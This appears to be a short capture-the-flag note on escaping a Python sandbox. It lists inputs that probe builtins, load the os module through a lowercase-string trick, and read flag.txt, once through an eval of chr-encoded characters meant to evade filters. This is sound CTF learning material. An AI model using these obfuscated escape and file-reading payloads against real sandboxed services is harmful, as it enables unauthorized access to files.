### Try some commands

```py
dir()
dir(__builtins__)
__builtins__.__dict__
__builtins__.__dict__['open']
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower())
dir(getattr)

eval(chr(105) + chr(110) + chr(116) + chr(40) + chr(111) + chr(112) + chr(101) + chr(110) + chr(40) + chr(39) + chr(102) + chr(108) + chr(97) + chr(103) + chr(46) + chr(116) + chr(120) + chr(116) + chr(39) + chr(44) + chr(32) + chr(39) + chr(114) + chr(39) + chr(41) + chr(46) + chr(114) + chr(101) + chr(97) + chr(100) + chr(40) + chr(41) + chr(41))

int(open("flag.txt", "r").read())
```
